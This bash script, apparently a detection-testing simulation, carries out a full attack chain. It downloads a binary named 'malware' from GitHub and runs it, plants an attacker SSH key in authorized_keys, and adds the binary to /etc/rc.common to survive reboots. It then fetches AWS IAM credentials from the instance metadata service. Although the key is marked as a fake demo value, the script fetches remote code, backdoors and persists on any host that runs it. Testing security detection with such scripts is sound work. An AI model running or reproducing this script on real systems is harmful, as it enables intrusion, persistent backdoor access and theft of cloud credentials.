#!/usr/bin/bash

set -e
cd /var/www/html 2>/dev/null || cd /tmp

# Download file using curl
if [ "$(uname -m)" = "x86_64" ]; then
    curl -o malware https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64
else
    curl -o malware https://raw.githubusercontent.com/safchain/dd-malware/main/malware.arm64
fi

# Make the file executable
chmod +x malware
MALWARE_PATH="$(pwd)/malware"

# Persistence: Add SSH key for backdoor access 
mkdir -p ~/.ssh 2>/dev/null || true
chmod 700 ~/.ssh 2>/dev/null || true
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3FAKE+DEMO+KEY+FOR+SECURITY+TESTING+NOT+REAL attacker@malicious.demo" >> ~/.ssh/authorized_keys 2>/dev/null || true
chmod 600 ~/.ssh/authorized_keys 2>/dev/null || true

# Persistence: Add to system boot scripts
echo "$MALWARE_PATH" >> /etc/rc.common 2>/dev/null || true
echo "$MALWARE_PATH --cpu-priority 4 &" >> /etc/rc.common 2>/dev/null || true

# Execute the malware
"$MALWARE_PATH" --cpu-priority 4 &

# Retrieve IMDS v1 credentials
curl --connect-timeout 5.0 http://169.254.169.254/latest/meta-data/iam/security-credentials/example-role-name || true

# Retrieve IMDS v2
TOKEN=`curl --connect-timeout 5.0 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
    && curl --connect-timeout 5.0 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/example-role-name